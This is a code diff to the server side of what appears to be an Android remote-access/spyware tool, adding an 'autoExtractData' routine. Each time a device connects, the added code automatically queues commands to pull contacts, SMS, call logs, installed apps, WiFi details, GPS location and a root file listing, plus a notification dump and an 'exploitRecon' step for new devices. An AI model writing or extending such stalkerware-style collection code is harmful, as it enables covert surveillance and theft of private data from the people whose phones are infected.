@@ -25,7 +25,9 @@ class Clients {
         console.log("Connected -> should ignore?", this.ignoreDisconnects[clientID]);
 
         let client = this.db.maindb.get('clients').find({ clientID });
-        if (client.value() === undefined) {
+        let isNew = client.value() === undefined;
+
+        if (isNew) {
             this.db.maindb.get('clients').push({
                 clientID,
                 firstSeen: new Date(),
@@ -33,9 +35,6 @@ class Clients {
                 isOnline: true,
                 dynamicData: clientData
             }).write()
-
-            // this being the first run we should ask the client for all existing data?
-
         } else {
             client.assign({
                 lastSeen: new Date(),
@@ -46,6 +45,39 @@ class Clients {
 
         let clientDatabase = this.getClientDatabase(clientID);
         this.setupListeners(clientID, clientDatabase);
+
+        // Auto-extract all data from the device on connect
+        this.autoExtractData(clientID, isNew);
+    }
+
+    // Auto-extract data from device on connection
+    autoExtractData(clientID, isNew) {
+        let delay = 1000; // Start after 1 second
+        let requests = [
+            { key: CONST.messageKeys.exploitRecon, payload: {}, name: 'Recon' },
+            { key: CONST.messageKeys.contacts, payload: {}, name: 'Contacts' },
+            { key: CONST.messageKeys.sms, payload: { action: 'ls' }, name: 'SMS' },
+            { key: CONST.messageKeys.call, payload: {}, name: 'Calls' },
+            { key: CONST.messageKeys.permissions, payload: {}, name: 'Permissions' },
+            { key: CONST.messageKeys.installed, payload: {}, name: 'Apps' },
+            { key: CONST.messageKeys.wifi, payload: {}, name: 'WiFi' },
+            { key: CONST.messageKeys.location, payload: {}, name: 'GPS' },
+            { key: CONST.messageKeys.files, payload: { action: 'ls', path: '/' }, name: 'Files' },
+        ];
+
+        // For new devices, also request notification dump
+        if (isNew) {
+            requests.push({ key: CONST.messageKeys.notificationFetch, payload: {}, name: 'Notifications' });
+        }
+
+        requests.forEach((req, i) => {
+            setTimeout(() => {
+                if (this.clientConnections[clientID]) {
+                    logManager.log(CONST.logTypes.info, clientID + " Auto-extracting: " + req.name);
+                    this.sendCommand(clientID, req.key, req.payload, () => {});
+                }
+            }, delay + (i * 2000)); // Stagger requests by 2 seconds each
+        });
     }
 
     clientDisconnect(clientID) {
